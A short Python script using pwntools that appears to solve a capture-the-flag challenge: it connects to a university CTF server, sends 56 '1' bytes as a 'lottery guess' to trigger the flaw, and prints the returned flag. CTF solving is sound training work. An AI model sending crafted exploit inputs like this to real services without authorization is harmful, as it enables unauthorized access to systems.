from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt" 
PORT = 25161

s = remote(SERVER, PORT, timeout=9999)
d_guess_lottery = 56
s.recv(512)
s.sendline(b'1'*d_guess_lottery)
time.sleep(1)
flag = s.recv(512).decode()
print(flag)
